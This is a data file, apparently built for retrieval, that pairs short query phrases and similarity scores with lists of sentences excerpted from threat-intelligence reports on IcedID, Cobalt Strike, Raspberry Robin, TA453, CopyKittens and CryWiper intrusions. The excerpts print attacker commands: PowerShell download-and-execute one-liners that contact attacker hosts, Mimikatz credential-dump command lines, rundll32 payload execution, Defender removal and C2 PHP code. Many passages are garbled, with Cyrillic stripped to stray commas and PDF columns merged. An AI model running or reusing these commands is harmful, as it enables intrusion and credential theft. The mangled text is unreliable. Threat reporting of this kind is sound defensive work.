eyewear.dat, initially located in a hidden folder named max, to the users AppData\\\\Local\\\\Temp\\\\ folder :C:\\\\Windows\\\\system32\\\\cmd.exe /c D:\\\\max\\\\eyewear.bat \t xcopy /s /i /e /h max\\\\easygoing.dat C:\\\\Users\\\\[REDACTED]\\\\AppData\\\\Local\\\\Temp\\\\*Then, DLL was executed using rundll32.exe :C:\\\\Windows\\\\system32\\\\cmd.exe /c D:\\\\max\\\\eyewear.bat \t rundll32 C:\\\\Users\\\\[REDACTED]\\\\AppData\\\\Local\\\\Temp\\\\easygoing.dat,#1Want to block ISOs from automatically mounting when double clicked?', 'Check outHuntresss recent writeup.On the second day of the intrusion, the threat actors used the IcedID malware to drop a Cobalt Strike beacon and execut it using regsvr32.exe.After beginning to move laterally, the threat actors used many other execution techniques such as PowerShell and executables run from their interactive RDP session in addition to DLLs.A number of application crashes were observed across several compromised hosts.']
ProcDump was used to dump LSASS memory.|0.7725874790602101|['Furthermore, the usage of Microsoft BitLocker is not unusual in corporate environments which makes detection more challenging.', 'In addition to living-of-the-land tools, the threat actor used commercial, off-the-shelf encryption software Jetico BestCrypt for server encryption purposes.', 'One might argue that using this software (which is digital signed by Jetico Inc. Oy) allowed the threat actor to stay under the radar.', 'From a threat actors perspective commercial, off-the-shelf encryption software like Jetico BestCrypt has the potential to be misused as ransomware that is digital signed and trusted by anti-virus vendors.', 'Credential Access The first post-exploitation activities that the threat actor performed after compromising the patient zero system was to upload several tools like for example Procdump and NATBypass to the staging directory aspnet_client.', 'Next the threat actor used Procdump to create a memory dump of the LSASS process.', 'DIRT found a corresponding Amcache entry that proves the the execution of Procdump.', 'In addition to that the registry key EulaAccepted was set which is related to the usage of the argument -accepteula which was supplied during the execution of procdump64.exe.', 'Forensic Artifacts Credential Access Last but not least DIRT found forensic evidence of execution that shows that the threat actor used a tool called C:\\\\PerfLogs\\\\secretsdump.exe on one of the domain controllers in the compromised 4/15environment.', 'By looking up the hash on VirusTotal we were able to confirm that secretsdump.exe is the PyInstaller version of Impackets secretsdump.py.', 'The threat actor leveraged the tool to create a LSA secerts dump hashes.txt and store its contents in the staging directory C:\\\\PerfLogs\\\\.']
ProcDump was used to dump LSASS memory.|0.8190431016351519|['These beacons, however, continued to crash and fail to run.', 'Around an hour after starting the RDP session, the threat actors executed a PowerShell command to disable Windows Defender Antivirus on the host and reviewed Group Policy Objects for the domain.', 'The Cobalt Strike beacons then began to execute successfully on the domain controller.', 'Now, with Cobalt Strike beacons on the domain controller, the threat actors continued with discovery actions using Invoke-ShareFinder and other PowerShell and system utilities.A few hours after, the threat actors installed theRSAT toolsonto the beachhead host.', 'However, they appear to have been unfamiliar with the tools and called up the help menu before using Get-ADComputer to collect the details on hosts in the environment.', 'Back on the domain controller, ProcDump was used to dump LSASS memory.', 'The PowerShell command Get-EventLog was then used to collect logon events on all domain administrators in the network.The threat actors went quiet for around seven hours.', 'When they returned, several more Cobalt Strike beacons were launched and several different Mimikatz implementations were executed on the domain controller, including a Mimikatz executable and a PowerShell implementation.', 'For the next several hours, repeats of previous discovery actions and additional beacons executed using remote WMIC commands, were observed.', 'During this time, Windows event logs point to the threat actors completing DCSync activities on one of the domain controllers.', 'A new batch file, localdisk.bat, was also executed using remote WMI commands, to collect disk data on hosts around the environment.']
several different Mimikatz implementations were executed on the domain controller, including a Mimikatz executable|0.7678838602762578|['The Cobalt Strike beacons then began to execute successfully on the domain controller.', 'Now, with Cobalt Strike beacons on the domain controller, the threat actors continued with discovery actions using Invoke-ShareFinder and other PowerShell and system utilities.A few hours after, the threat actors installed theRSAT toolsonto the beachhead host.', 'However, they appear to have been unfamiliar with the tools and called up the help menu before using Get-ADComputer to collect the details on hosts in the environment.', 'Back on the domain controller, ProcDump was used to dump LSASS memory.', 'The PowerShell command Get-EventLog was then used to collect logon events on all domain administrators in the network.The threat actors went quiet for around seven hours.', 'When they returned, several more Cobalt Strike beacons were launched and several different Mimikatz implementations were executed on the domain controller, including a Mimikatz executable and a PowerShell implementation.', 'For the next several hours, repeats of previous discovery actions and additional beacons executed using remote WMIC commands, were observed.', 'During this time, Windows event logs point to the threat actors completing DCSync activities on one of the domain controllers.', 'A new batch file, localdisk.bat, was also executed using remote WMI commands, to collect disk data on hosts around the environment.', 'These discovery actions were completed several times again in other various batch files.On the start of the fourth day, the threat actors continued to repeat their previous discovery and beacon spreading activity.', 'Near the end of the day, the threat actors moved to install AnyDesk on several servers including a backup management host, likely as a further means of persistence or later command and control.']
They issued remote commands using WMIC to conduct discovery, as well as distribute and execute Cobalt Strike beacons.|0.9999999999999999|['After this, the threat actors began their first lateral movement to a server in the environment by copying their Cobalt Strike DLL over to the host and executing it via a remote service.', 'They then repeated the install of the remote access software package.Some two hours later, another Cobalt Strike beacon was executed.', 'With this beacon, the threat actors succeeded in elevating to SYSTEM on the beachhead host and proceeded to dump LSASS memory.', 'Another round of activity took place using system tools, batch files, and Adget.', 'Several more beacons were also loaded on the host using DLLs and PowerShell.At this point, the threat actors had the clear text credentials for one of the domain administrator accounts and began moving laterally to other systems.', 'They issued remote commands using WMIC to conduct discovery, as well as distribute and execute Cobalt Strike beacons.', 'These actions, however, failed to get a beacon to launch on the domain controller being targeted.', 'After an hour or so of failures, the threat actors proceeded to RDP into the domain controller.', 'Once there, they then loaded textbin[.', ']net, a pastebin style site, to download Cobalt Strike PowerShell code to the host in a file named pon.txt.Trying to execute this locally failed as well, and the threat actor moved on to downloading a variety of beacon executables (e.g.', 'lsass.exe, lsasss.exe, etc.).']
RDP traffic|0.7800175804684126|['6/8 ID CryWiper ,      .', 'ID    , ,  ,  .', ':    ,  ID    .', ', CryWiper  , ,         .', 'CryWiper      CryWiper  ,   .', '.', 'CryWiper   IsaaWiper   ,    .', '.', ',   ,  :    (, MD5: 4A42F739CE694DB7B3CDD3C233CE7FB1, 71D9E6EE26D46C4DBB3D8E6DF19DDA7D, 0C6D33DA653230F56A7168E73F1448AC).', '-  Trojan-Ransom.Win32.Xorist,     Trojan-Ransom.MSIL.Agent.', ',  ,  2017 .']
RDP traffic|0.7800175804684126|['CryWiper ,    ,  .', '.exe C:\\\\Windows .dll tmp .lnk winnt .sys temp .msi thumb .CRY System Volume Information Boot Windows Trend Micro    .CRY.', '5/8 ,  .', ',       IsaacWiper.', ',    .', ',    .', ', IsaacWiper    , CryWiper,   ,   .', ',  CryWiper    README.txt  .', ',   Bitcoin-  ,    ID .', '6/8 ID CryWiper ,      .', 'ID    , ,  ,  .']
RDP traffic|0.7800175804684126|['-    -   .', 'Hi-Tech Crime Trends         ,  - ,  .', 'Hi-Tech Crime Trends  -,  - , SOC-,   ,      .', 'Hi-Tech Crime Trends  -   ,     ,  .', 'Group-IB  ,  ,    -    -   .', '.', 'Group-IB:  ,  ,   Leaks  ,  ,      ,  ,  ,  Group-IB   ,  ,     ,   ,   ,   GROUP-IB.RU  6   Group-IB    Hi-Tech Crime Trends,              .', ': Group-IB Threat Intelligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB            , ,  - .', ',   Group-IB    ,     .', ', - -   .']
loads it using rundll32|0.812022029607377|"[']re pointing to a QNAP compromised device as seen in the Cybereason Defense PlatformExtract from https://www.shodan.io/host/195.158.67.252, showing that the server that resolves from 6y[.', ']re is a QNAP device with a service hosted on TCP port 8080Spread Through Process InjectionThe next step for this threat is to inject itself into other processes, namely rundll32.exe, dllhost.exe and regsvr32.exe on the observed victims.', 'The Cybereason Defense Platform detects this injection and can help to link the creator process and the created ones.The number of injected system processes is generally high (between 50 and 300) and some of these processes communicate with TOR (The Onion Router) exit nodes:Raspberry Robin injecting system processes, which then communicate with TOR-related IP addresses, as seen in the Cybereason Defense PlatformPersistenceRaspberry Robin installs itself into a registry run key in the Windows users hive, for example:Hku\\\\[GUID]\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\runonce\\\\vayp with value RUNDLL32 SHELL32.DLL,ShellExec_RunDLLA REGSVR32.EXE /u -S ""C:\\\\Users\\\\[UserName]\\\\AppData\\\\Local\\\\Temp\\\\cnsbi.mh.', '""As a result, rundll32.exe loads the same DLL as the one which the initial msiexec.exe process downloaded in the infection stage.', 'It then proceeds with the same process injection and communication as described above.The loaded DLL has a random extension (pi.loc, cr.mf, etc.)', 'and rundll32.exe loads it with a .', 'at the end:Process tree showing the persistence mechanisms used by Raspberry Robin as seen in the Cybereason Defense PlatformRegarding the persistence aspects, the following diagram represents the way the malicious module executes at each machine startup:Raspberry Robin persistence process following an initial infection and running at each machine bootAs the malicious module is the same one as during the initial infection process, it displays the same malicious activities involving process injection and communication with Tor exit nodes.This module contains specific indicators, including the fact that it masquerades as an Apache shared library (DLL) called libapriconv-1.dll:Raspberry Robin leverages malicious module loading masquerading as Apache shared libraries (DLL)The other samples the GSOC team identified on other Raspberry Robin cases also use different masquerading processes (for instance, impersonating QT 5).This specific module is also peculiar due to the fact that the chain of certification is broken, making it signed but not verified by the Windows system.', 'The code signing name is OmniContact and can be used as a filter on VirusTotal.com to check for similar samples.Excerpt from virustotal.com showing a sample detailed informationIn 75% of the observed victims, the malicious module downloaded by Raspberry Robin was signed by OmniContact.Network CommunicationsFinally, the victim devices of Raspberry Robin created a high amount of network packets to TOR exit nodes.', 'The GSOC team observed that the TCP ports used were 80, 443 and 8080.Cybereason RecommendationsTheCybereason Defense Platformdetects and prevents Raspberry Robin infections in Microsoft products.', 'Cybereason recommends the following:Block outgoing connections (outside of the organization) to TOR-related addresses, as Raspberry Robin actively communicates with TOR exit nodes.As Raspberry Robin displays persistence mechanisms and establishes many masquerading actions on the infected system, re-image infected devices.Threat Hunting with Cybereason: The Cybereason MDR team provides its customers with custom hunting queries for detecting specific threats - to find out more about threat hunting andManaged Detection and Responsewith the Cybereason Defense Platform,contact a Cybereason Defender here.For Cybereason customers: More detailsavailable on the NESTincluding custom threat hunting queries for detecting this threat:The Cybereason Defense Platform detects Raspberry Robin initial access methodThe Cybereason Defense Platform detects the Raspberry Robin malicious module loadingIndicators of Compromise (IOCs)Looking for the IOCs?', 'Open the chatbot on the bottom right corner of your screen to access the Raspberry Robin IOCs.About the ResearcherLoc Castel, Principal Security Analyst, Cybereason Global SOCLoc Castel is a Principal Security Analyst with the Cybereason Global SOC team.']"
The injection is also visible from memory dumps|0.9743441787695135|"['Such access can be tracked with Sysmon event ID 10 (ProcessAccess).', 'As explained inthis blog written by Jonathan JOHNSON, opening a handle to WinLogon in order to duplicate the token and call ImpersonateLoggedOnUser is a known Cobalt Strike technique.ZeroLogonOn the second day of the intrusion, a spike in NetLogon traffic was observed from the beachhead host to a domain controller.', 'This traffic then triggered several network signatures for CVE-2020-1472 otherwise known as ZeroLogon.ET EXPLOIT Possible Zerologon Phase 1/3 - NetrServerReqChallenge with 0x00 Client Challenge (CVE-2020-1472) ET EXPLOIT Zerologon Phase 2/3 - NetrServerAuthenticate2 Request with 0x00 Client Challenge and Sign and Seal Disabled (CVE-2020-1472) M1 ET EXPLOIT Zerologon Phase 3/3 - Malicious NetrServerPasswordSet2 (CVE-2020-1472)The event logs corroborated a successful exploitation with a password update Event 4742 for one of the Domain Controller passwords.Mark-of-the-Web BypassThe threat actors delivered the initial malware as a zip file, with the contents of a ISO file, which contained their payload to gain access to the target environment.', 'These packages are designed to evade controls such as Mark-of-the-Web restrictions.Windows Defender tamperingOn one host, the threat actors ran the following command to try and clear the way for their activity, likely due to the difficulty the threat actors were having with beacons crashing.powershell.exe Uninstall-WindowsFeature -Name Windows-Defender-GUIThis command was downloaded from a remote site to a file named pon!.txt and then executed locally.Process injectionMultiple suspicious calls to the function CreateRemoteThread (Sysmon Event ID 8) were observed.', 'This is a known behavior of Cobalt Strike and its function shinject, which can be used to inject a new beacon or a specific program to another process on the victims computer.As a result, we observed abnormal winlogon.exe process behavior; winlogon.exe performed DNS requests (Sysmon event ID 22) to a Cobalt Strike C2 domain guteyutu[.', ']com.The injection is also visible from memory dumps.', 'Several hosts showed rundll32 processes exhibiting common process injection behavior, where the MZ file header is seen in the starting memory address in rundll32 processes with PAGE_EXECUTE_READWRITE permissions.Many of these beacons could also be detected in memory scanning with theMalpedia Cobalt Strikerule.', 'A sample of a scanning run is displayed below:HostProcess IDProcess NameCommand LineYara RuleSERVERA568winlogon.exewinlogon.exewin_cobalt_strike_autoSERVERA4284RuntimeBroker.exeC:\\\\Windows\\\\System32\\\\RuntimeBroker.exe -Embeddingwin_cobalt_strike_autoSERVERB9936rundll32.exeC:\\\\Windows\\\\syswow64\\\\rundll32.exewin_cobalt_strike_autoBEACHHEAD996svchost.exeC:\\\\Windows\\\\system32\\\\svchost.exe -k DcomLaunch -p -s LSMwin_cobalt_strike_autoBEACHHEAD1888svchost.exeC:\\\\Windows\\\\System32\\\\svchost.exe -k LocalSystemNetworkRestricted -p -s AudioEndpointBuilderwin_cobalt_strike_autoBEACHHEAD2220winlogon.exewinlogon.exewin_cobalt_strike_autoBEACHHEAD7032rundll32.exeC:\\\\Windows\\\\syswow64\\\\rundll32.exewin_cobalt_strike_autoSERVERC3328rundll32.exeC:\\\\Windows\\\\syswow64\\\\rundll32.exewin_cobalt_strike_autoMultiple tools and scripts were used to access and collect credentials from compromised hosts.', 'There were several variants of Mimikatz in binary and PowerShell form:""C:\\\\ProgramData\\\\mimikatz.exe"" ""C:\\\\ProgramData\\\\mimikatz.exe.exe"" ""C:\\\\ProgramData\\\\mimikatz_cryptovanniy.exe"" ""C:\\\\ProgramData\\\\notepad.exe"" ""C:\\\\ProgramData\\\\katz.ps1Commands used to collect credentials and export to text files stored in the C:\\\\ProgramData folder included the following:C:\\\\Windows\\\\system32\\\\cmd.exe /C mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords"" ""exit"" >> c:\\\\programdata\\\\mimikatz\\\\creds.txt C:\\\\Windows\\\\system32\\\\cmd.exe /C mimikatz.exe privilege::debug sekurlsa::logonPasswords full samdump::hashes exit > ""c:\\\\programdata\\\\creds.txt"" C:\\\\Windows\\\\system32\\\\cmd.exe powershell -ep bypass -C ""import-module .\\\\katz.ps1;Invoke-Katz"" > mimi.txtDCSyncCredentials were also dumped via DCSync using two compromised high privilege accounts.', 'The activity was observed in Windows Security Event ID 4662, with known indicators including non-computer based account, an access mask of 0x100, and object IDs.1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 - DS-Replication-Get-Changes-All 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 - DS-Replication-Get-ChangesDCSync was observed across 12 events, with separate events for each object ID.', 'It is likely the operator used the Cobalt Strike DCSync command, having observed them already enter this directly in the host OS command shell.For additional details,SpecterOps has an article covering the DCSync technique.Code injection in LSASSMultiple injections into the LSASS process were observed on multiple hosts.Threat actors used the function CreateRemoteThread in order to inject malicious code in LSASS process to access credentials.Process dump of the LSASS process was undertaken using the Sysinternals ProcDump utility:This process was invoked by RunDLL32.exe which was an injected Cobalt Strike beacon reaching out to the command and control server at 111.90.143[.']"
an injected Cobalt Strike beacon|0.8295960768918719|['-    -   .', 'Hi-Tech Crime Trends         ,  - ,  .', 'Hi-Tech Crime Trends  -,  - , SOC-,   ,      .', 'Hi-Tech Crime Trends  -   ,     ,  .', 'Group-IB  ,  ,    -    -   .', '.', 'Group-IB:  ,  ,   Leaks  ,  ,      ,  ,  ,  Group-IB   ,  ,     ,   ,   ,   GROUP-IB.RU  6   Group-IB    Hi-Tech Crime Trends,              .', ': Group-IB Threat Intelligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB            , ,  - .', ',   Group-IB    ,     .', ', - -   .']
an injected Cobalt Strike beacon|0.8295960768918719|"['cert.gov.ua /article/39708     """"  Cobalt Strike Beacon (CERT-UA#4490) :     CERT-UA    ""!', '! ""', 'XLS- "" .xls"",  .', ',  ,    ""pe.dll"".   \'', 'Cobalt Strike Beacon.', ',  ""pe.dll"", ,  ""spisok.exe""  CERT-UA#4464,  ,   TrickBot.', 'UAC-0098.', ': : 877f834e8788d05b625ba639b9318512 ea9dae45f81fe3527c62ad7b84b03d19629014b1a0e346b6aa933e52b0929d8a  .xls e28ac0f94df75519a60ecc860475e6b3 9990fe0d8aac0b4a6040d5979afd822c2212d9aec2b90e5d10c0b15dee8d61b1 pe.dll (2022-04-15) a3534cc24a76fa81ce38676027de9533 39a868e84524669491d6a251264144f0bfaca4f664d3fd10151854c341077262 shellcode.bin.packed.dll eb18207d505a1de30af6c7baafd28e8e ff30fdd64297ac41937f9a018753871fee0e888844fbcf7bf92bf5f8d6f57090 notevil.dll (CS Beacon) : hxxp://138[.', ']68.229.0/pe.dll hxxps://dezword[.', ']com/apiv8/getStatus 1/3hxxps://dezword[.']"
an injected Cobalt Strike beacon|0.8295960768918719|"['cert.gov.ua /article/38155     Cobalt Strike Beacon (CERT-UA#4227)     Cobalt Strike Beacon (CERT-UA#4227)      CERT-UA RAR- "".rar"",  RAR- "" 21.03.rar"", ,  , SFX- "" filercs.rar"" (  \'  right-to-left override (RTLO) ).', ',  VBScript- (Thumbs.db),   .NET- ""dhdhk0k34.com"".  \'', 'Cobalt Strike Beacon.', ',   ""inject.exe"" - 15.03.2022 ,  VBScript-,     UAC-0051 (unc1151/GhostWriter).', 'MD5 SHA256  e4b54ee2f0068762179e7e514d90bf16 fbabc4e5a6470606fc64c39c182b5a7a71f8fa96f50c67725d52abf184f75fd4 .rar 4a78df33d4f987103dc0c0f3a302b8cb 59ed536e1955e310f321435d43ca8b60cb3746514f3c3ea951d43633cacbe7bc 21.03.rar bcdab4ae622811f699765bfb9cb909d2 6149680c8541980d46c17681e37e4751e2baca1d13ee648b8188dfb24bf56f7c file rcs.rar b5525108912ee8d5f1519f1b552723e8 d324d7f30984931176ff878a81c7c1f4f979ad3d759c7f33427bba10d9deb1f6 Thumbs.db 3303286735a07ae5d14db9c12843d44e f98e1e61c84a5ed098e7481ab339e2881195f4d1b101c92b81113eb7ff56e63d dhdhk0k34.com 18e73cc3d5eda742530ba3fef59e3943 1/237e644deee0add76bac9c5121355a03a459b1a97917383765bf3df94e9af7e29 Skype.exe b724ff750dff495e6634ddf0f1263844 7cf3f758b2abb303dec89736dfd55c38309a21aec2d83d3d4e590f9538fc5f15 inject.exe (2022-03-15) 1365b82e7da0968e97c095d8bd9166dd c14fce93183dc4173be02b2a48d1ed06b43656c7b6d5a290d9948b6947df9033 csbeacon.bin (Cobalt Strike Beacon) hXXps://ao3.hmgo[.', ']pw/tags/Akihabara@TODEEP/works hXXps://ao3.hmgo[.', ']pw/tags/Akihabara@TODEEP/works/update ao3.hmgo[.', ']pw hmgo[.']"
host,|0.8482594500282106|"['Using this IP validation scheme, the actor verifies whether the incoming request is from the victim or not.', '6.', 'On top of that, the operator relies on several other processes to carefully deliver the next payload such as checking OS type and predefined user-agent strings.', '2/14C2 server structure C2 script (download.php) for malicious document delivery As a result of analyzing the server-side script to convey a malicious document, we figured out how this actor verifies the request from the client and minimizes exposure of their payload.', 'This script works with a specific parameter name from the victim, so we suspect the actor delivers a download link to the victim via email or by sending a request using another type of payload.', '1.', 'It checks the who GET parameter from the victim.', 'The who parameter contains an email address without a domain name.', '1 if (isset($_GET[\'who\']) && $_GET[\'who\'] == ""[redacted]"") # Check \'who\' parameter value 2 { 3 4 $vbs_server = ""weworld59.myartsonline.com""; # The next stage server 5 $virus = ""v.doc""; # Malicious document 6 $unvirus = ""un.doc""; # Benign document 7 $downname = ""CV.DHOM Alexandra Siddall (Korean).doc""; # Delivered file name 8 9 $who = $_GET[\'who\']; 10 $down = $who .', '"".txt""; 3/142.', 'If the incoming request contains an expected email address, it saves the date, IP address and user-agent to the [who]_downhistory.txt file.']"
host,|0.8421570472356291|"['Similar to the document sent by ""Harald,"" this document also used remote template injection to download Korg.', ""KorgTA453's Latest Remote Template Injection As noted above, some of TA453's campaigns delivered OneDrive links that hosted malicious documents."", 'The documents are the latest version of the TA453 remote template injection documents discussed by 6/8PwC in July 2022.', 'The password protected documents downloaded the macro enabled template documents from 354pstw4a5f8.filecloudonline[.]com.', 'Proofpoint observed multiple campaigns reusing that specific filecloudonline[.', ']com host.', 'The downloaded template, dubbed Korg by Proofpoint, has three macros: Module1.bas, Module2.bas, and ThisDocument.cls.', ""The macros collect information such as username, list of running processes along with the user's public IP from my-ip.io and then exfiltrates that information using the Telegram API."", 'At this time, Proofpoint has only observed the beaconing information and has not observed any follow-on exploitation capabilities.', 'The lack of code execution or command and control capabilities within the TA453 macros is abnormal.', 'Proofpoint judges that infected users may be subject to additional exploitation based on the software identified on their machines.']"
host,|1.0|"['17 http://www.clearskysec.com/oilrig/ Page 12 of 48 All rights reserved to ClearSky cyber security and Trend Micro, 2017The self-extracting executable serves as a downloader, running the following command: cmd.exe /c powershell.exe -nop -w hidden -c ""((new-object net.webclient).downloadstring(\'http://jpsrv-java-jdkec2.javaupdate[.', ']co:80/JPOST\'))"" The C&C server sends back a short PowerShell code that loads a Cobalt Strike stager into memory.', 'Base64 encoded PowerShell code that loads Cobalt Strike stager into memory Stager shellcode with marked user agent and C&C server address Both the docx and the executable contained the name shiranz in their metadata or file paths: LastModifiedBy shiranz C:\\\\Users\\\\shiranz\\\\Desktop\\\\checkpointsslvpn?fdp.exe C:\\\\Users\\\\shiranz\\\\AppData\\\\Local\\\\Temp\\\\checkpointsslvpn?fdp.exe Page 13 of 48 All rights reserved to ClearSky cyber security and Trend Micro, 2017In another sample, the decoy document was in Turkish, indicating the target\'s nationality.18 This document was likely stolen from the Turkish Ministry of Foreign Affairs: test_fdp.exe.19 Decoy document in Turkish While the decoy PDF document is opened, the following commands are executed: cmd.exe /c copy Ma_1.tmp ""%userprofile%\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup""\\\\CheckpointGO.pif&& copy sslvpn.tmp %userprofile%\\\\desktop\\\\sslvpnmanual.pdf&& cd %userprofile%\\\\desktop&& sslvpnmanual.pdf cmd.exe /c powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring(\'http://jpsrv-java-jdkec2.javaupdate[.', ']co:80/Sourcefire\'))"" 18 https://www.hybrid-analysis.com/sample/a4adbea4fcbb242f7eac48ddbf13c814d5eec9220f7dce01b2cc8b56a806cd37 19 https://www.virustotal.com/en/file/a4adbea4fcbb242f7eac48ddbf13c814d5eec9220f7dce01b2cc8b56a806cd37/analysis Page 14 of 48 All rights reserved to ClearSky cyber security and Trend Micro, 2017Malicious Macros In October 2016, the attackers uploaded to VirusTotal multiple files containing macros, likely to learn if they are detected by antivirus engines.', 'For example, ""Date.dotm"" contains this default Word template content:20 A default template of a Word document used as decoy The macro runs a Cobalt Strike stager that communicates with wk-in-f104.1c100.n.microsoft-security[.', ']host .', ""The attackers also uploaded an executable files that would run a Word document with content in Hebrew.21 Hebrew decoy document The word document contains a macro that runs the following command: cmd.exe /c powershell -ExecutionPolicy bypass -noprofile -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile('http://pht.is.nlb-deploy.edge-dyn.e11.f20.ads-youtube."", ""online/winini.exe','%TEMP%\\\\XU.exe');&start %TEMP%\\\\XU.exe& exit In parallel, the executable drops d5tjo.exe, which is the legitimate Madshi debugging tool 2223 20 https://www.virustotal.com/en/file/7e3c9323be2898d92666df33eb6e73a46c28e8e34630a2bd1db96aeb39586aeb/analysis/ 21 https://www.virustotal.com/en/file/9e5ab438deb327e26266c27891b3573c302113b8d239abc7f9aaa7eff9c4f7bb/analysis 22 https://www.virustotal.com/en/file/7ad65e39b79ad56c02a90dfab8090392ec5ffed10a8e276b86ec9b1f2524ad31/analysis 23 http://help.madshi.net/madExcept.htm Page 15 of 48 All rights reserved to ClearSky cyber security and Trend Micro, 2017Fake Social Media Entities Back in 2013, CopyKittens used several Facebook profiles to spread links to a website impersonating Haaretz news, an Israeli newspaper."", 'In the screenshot below you can see the fake profile linking to haarettz.co[.', ']il (note the extra t in the domain).', '""Erick Brown""24 Fake profile ""Erik Brown"" posting link to malicious website ""Amanda Morgan""25 Fake profile ""Amanda Morgan"" posting link to malicious website The latter profile tagged a fake Israeli profile as her cousin, "" ""26 Fake profile "" "" 24 https://www.facebook.com/israelhoughtonandplanetshakersphilippineconcert/posts/711649418845349 25 https://www.facebook.com/ynetnews/posts/548075141952763 26 https://www.facebook.com/profile.php?id=100003169608706 Page 16 of 48 All rights reserved to ClearSky cyber security and Trend Micro, 2017Who in turn tagged another fake Israeli profile as her cousin 27 Fake profile "" "" While ""Erik Brown"" has not been publicly active since September 2015, and the two other Israeli profiles have not been publicly active since September 2013, Amanda Morgan is still active to date.']"
host,|1.0|['We make sure your homes, vehicles, and any other assets which require titling stay out of your name.', 'Contact us to reserve a consultation.', 'IntelTechniques.comUPDATES By Michael Bazzell This quarter, I announced three big updates to the free resources available at IntelTechniques.com.', 'OSINT Tools This magazine serves as a compliment to the podcast, which Three years ago, we were bullied into taking our search tools can be found at IntelTechniques.com.', 'Below are summaries of the offline, threatened with lawsuits, and suspended by our web episodes from last month.', 'host.', 'Now, the tools return with updates, free for everyone.', 'New features are being added weekly.', 'The latest version of all 267-macOS Privacy & Security Revisited: After a lot of talk tools can be found at the following URL.', 'about Linux, I revisit privacy and security considerations for macOS machines.', 'https://inteltechniques.com/tools/ 268-CCW Permits, UNREDACTED 003, & Linux Questions: I discuss the California CCW leak, release the latest issue of Credential Exposure Removal Guide UNREDACTED Magazine, and answer several listeners Linux questions.']
host,|0.8482594500282106|"['"".txt"";If the incoming request contains an expected email address, it saves the date, IP address and user-agent to the[who]_downhistory.txtfile.If the user-agent containsWindows,which means the victim is a Windows machine, it goes to the next step.', 'Otherwise, it delivers a benign document to the victim.Next, the script checks whether the connection from the victim is the first request or not by checking the existence of the[who].txtfile.If the[who].txtfile does not exist, it means its the first request from the victim, so the script forwards the IP address to the other server (VBS server), delivering the malicious document, saving the victims information to the[who].txtincluding date, IP address and user-agent.Note that the script sends the victims IP address to the other server (named VBS server by the author).', 'If the victim connects with an appropriate email address and if its an initial connection, the C2 script forwards the IP address to the specific servers with/index.php?ip=GET request.', 'Sending the appropriate victim IP addresses to the remote server is a very important process for the operational security of this actor.', 'Well look in more detail at how the operator uses this information in the next section.functionsend_ip($host,$data){$fp=@fsockopen(""tcp://"".$host,80,$errno,$errstr,30);if(!$fp){}else{$out=""GET /index.php?ip="".$data.""', 'HTTP/1.1\\\\r\\\\n"";$out.=""Host: "".$host.', '""\\\\r\\\\n"";$out.=""Connection: Close\\\\r\\\\n\\\\r\\\\n"";fwrite($fp,$out);fclose($fp);}}Looking at the corresponding script (index.php) of the above IP-delivering GET request, heres how it works.', 'Once this script receives an IP address in theipparameter of the HTTP request, it extracts the victims IP address fromipparameter and saves it to theallow.txtfile.', 'Otherwise, it saves the client information to theerror.txtfile and redirects the client tomail.google.comin this case.', 'Additionally, the author used various legitimate websites for redirection, such as naver.com, kisa.or.kr, or other popular email services.', 'Theallow.txtfile, which contains the appropriate victims IP address, is referred by another C2 script to verify whether the incoming request is valid and thus whether or not to deliver the next stage payload.if(isset($_GET[\'ip\'])){$szfilename=""allow.txt"";$pfile=fopen($szfilename,""ab"");$res=$_GET[\'ip\'].""\\\\r\\\\n"";fwrite($pfile,$res);fclose($pfile);exit;}$szfilename=""error.txt"";$pfile=fopen($szfilename,""ab"");$res=$date.""-"".""\\\\r\\\\n"".$ip.""\\\\r\\\\n"".$_SERVER[\'HTTP_USER_AGENT\'].']"
host,|0.8421570472356291|"['Four days later, one of the cc\'d TA453 personas, ""Aaron Stein,"" dropped ""Carroll"" from the email thread, apologized to the target, and resent the same OneDrive link and password (Figure 6).Figure 6.', 'A cc\'d TA453 persona attempting to convince a target of the legitimacy of the campaign.Similar to the document sent by ""Harald,"" this document also used remote template injection to downloadKorg.KorgTA453\'s Latest Remote Template InjectionAs noted above, some of TA453\'s campaigns delivered OneDrive links that hosted malicious documents.', 'The documents are the latest version of the TA453 remote template injection documentsdiscussed by PwCin July 2022.', 'The password protected documents downloaded the macro enabled template documents from 354pstw4a5f8.filecloudonline[.]com.', 'Proofpoint observed multiple campaigns reusing that specific filecloudonline[.', ']com host.', 'The downloaded template, dubbedKorgby Proofpoint, has three macros: Module1.bas, Module2.bas, and ThisDocument.cls.', ""The macros collect information such as username, list of running processes along with the user's public IP from my-ip.io and then exfiltrates that information using the Telegram API.At this time, Proofpoint has only observed the beaconing information and has not observed any follow-on exploitation capabilities."", 'The lack of code execution or command and control capabilities within the TA453 macros is abnormal.', 'Proofpoint judges that infected users may be subject to additional exploitation based on the software identified on their machines.AttributionProofpoint continues to assess that TA453 operates in support of the Islamic Revolutionary Guard Corps (IRGC).', 'This assessment is based on a variety of evidence, including overlaps in unit numbering between Charming Kitten reports and IRGC units asidentified by PwC, theUS Department of Justice indictmentof Monica Witt and IRGC-affiliated actors, and analysis of TA453 targeting compared to reportedIRGC-IO priorities.Proofpoint tracks multiple subgroups of TA453 differentiated primarily by victimology, techniques, and infrastructure.']"
network configuration|0.782785664482021|['The most protocols for Linux and Unix.', 'heavily affected were Swisscom NOVEMBER 25, 2018 (AS3303) based in Switzerland, KPN (AS1136) based in the Netherlands, Krek Ltd, a small-scale Russian and Bouygues Telecom (AS5410) and The cases described above show operator, made a mistake in its BGP Numericable-SFR (AS21502) based that manipulating traffic does not configuration, causing 10-20% of in France.', 'The incident lasted for two require access to the targeted Russian Internet users to lose access hours.', '[3] companys network hardware.', 'Access to thousands of services.', 'The failure to an area border router is enough lasted for more than an hour and to be able to change the BGP affected major companies such as Another noteworthy example is a 2019 configuration.', 'Amazon, YouTube, VK (Russian social network), ivi.ru (online video streaming experiment, the aim of which was So far, BGP hijacking has had large-scale service), and many others.', '[1] to analyze new BGP security features.', 'but short-term effects.', 'For prolonged It culminated in the failure of routers sabotage, threat actors will need to have of 